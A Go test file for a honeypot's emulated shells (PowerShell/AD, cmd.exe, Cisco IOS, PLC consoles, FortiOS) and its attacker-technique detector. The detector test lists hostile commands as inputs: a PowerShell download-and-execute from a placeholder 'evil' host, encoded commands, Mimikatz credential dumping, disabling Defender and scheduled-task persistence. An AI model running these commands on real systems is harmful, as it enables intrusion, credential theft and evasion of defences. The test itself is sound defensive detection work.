package shell

import (
	"strings"
	"testing"

	"github.com/rom/tarpit-honeypot/internal/archetype"
)

func TestPowerShellActiveDirectory(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("active-directory"))
	send("$PSVersionTable")
	send("Get-ADUser administrator")
	send("whoami")
	cap, transcript := finish()
	if !strings.Contains(transcript, "PSVersion") {
		t.Errorf("powershell $PSVersionTable response missing: %q", transcript)
	}
	if !strings.Contains(transcript, "SamAccountName") {
		t.Errorf("Get-ADUser response missing: %q", transcript)
	}
	if !strings.Contains(transcript, "corp\\administrator") {
		t.Errorf("powershell whoami response missing: %q", transcript)
	}
	// AD enumeration must be flagged.
	if !hasMarker(cap.Anomalies, "shell-ad-recon") {
		t.Errorf("Get-ADUser not flagged shell-ad-recon: %v", cap.Anomalies)
	}
	// The prompt is the PowerShell prompt.
	if !strings.Contains(transcript, "PS C:\\") {
		t.Errorf("powershell prompt missing: %q", transcript)
	}
}

func TestCmdExeWindows(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("windows 10"))
	send("ver")
	send("whoami")
	_, transcript := finish()
	if !strings.Contains(transcript, "Microsoft Windows") {
		t.Errorf("cmd.exe ver response missing: %q", transcript)
	}
	if !strings.Contains(transcript, "nt authority\\system") {
		t.Errorf("cmd.exe whoami response missing: %q", transcript)
	}
}

func TestCiscoIOS(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("cisco-ios"))
	send("enable")
	send("show version")
	send("show running-config")
	_, transcript := finish()
	if !strings.Contains(transcript, "Password:") {
		t.Errorf("cisco enable should prompt for password: %q", transcript)
	}
	if !strings.Contains(transcript, "Cisco IOS Software") {
		t.Errorf("show version missing IOS banner: %q", transcript)
	}
	if !strings.Contains(transcript, "Building configuration") {
		t.Errorf("show running-config missing: %q", transcript)
	}
}

func TestPLCConsole(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("siemens-s7-1500"))
	send("info")
	send("show cpu")
	_, transcript := finish()
	if !strings.Contains(transcript, "SIMATIC") {
		t.Errorf("PLC info missing SIMATIC: %q", transcript)
	}
	if !strings.Contains(transcript, "RUN") {
		t.Errorf("PLC show cpu missing RUN mode: %q", transcript)
	}
}

func TestVendorPLCConsole(t *testing.T) {
	// A non-Siemens "plc"-quirk archetype gets the vendor-aware PLC console.
	send, finish := runShell(t, archetype.Lookup("schneider-modicon-m580"))
	send("info")
	_, transcript := finish()
	if !strings.Contains(transcript, "Schneider Modicon") {
		t.Errorf("Schneider PLC info should name the vendor: %q", transcript)
	}
}

func TestFortiOSCLI(t *testing.T) {
	send, finish := runShell(t, archetype.Lookup("fortigate"))
	send("get system status")
	send("config system global")
	_, transcript := finish()
	if !strings.Contains(transcript, "FortiGate") {
		t.Errorf("FortiOS status missing version banner: %q", transcript)
	}
	if !strings.Contains(transcript, "Command fail") {
		t.Errorf("FortiOS config should be refused (read-only): %q", transcript)
	}
}

func TestPowerShellTTPAnomalies(t *testing.T) {
	cases := map[string]string{
		"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')": "shell-ps-download-exec",
		"powershell -enc JABjAGwAaQBlAG4AdAA=":                               "shell-ps-encoded",
		"Invoke-Mimikatz -DumpCreds":                                         "shell-credential-dump",
		"Get-ADDomain":                                                       "shell-ad-recon",
		"Set-MpPreference -DisableRealtimeMonitoring $true":                  "shell-defender-tamper",
		"schtasks /create /tn evil /tr c:\\evil.exe /sc onlogon":             "shell-persistence-windows",
	}
	for line, want := range cases {
		if got := ScanAnomalies(line); !hasMarker(got, want) {
			t.Errorf("ScanAnomalies(%q) = %v; want marker %q", line, got, want)
		}
	}
}

func TestExtractWinVersion(t *testing.T) {
	cases := map[string]string{
		"Hardware: Intel64 - Software: Windows Version 10.0 (Build 19045 Multiprocessor Free)": "Version 10.0.19045",
		"Software: Windows Version 6.1 (Build 7601 Multiprocessor Free)":                       "Version 6.1.7601",
		"no version here": "Version 10.0.19045.3693",
	}
	for descr, want := range cases {
		if got := extractWinVersion(descr); got != want {
			t.Errorf("extractWinVersion(%q) = %q; want %q", descr, got, want)
		}
		// Never produce an unbalanced parenthesis or stray "Build".
		if strings.ContainsAny(extractWinVersion(descr), "()") || strings.Contains(extractWinVersion(descr), "Build") {
			t.Errorf("extractWinVersion(%q) malformed: %q", descr, extractWinVersion(descr))
		}
	}
}

func hasMarker(list []string, want string) bool {
	for _, m := range list {
		if m == want {
			return true
		}
	}
	return false
}
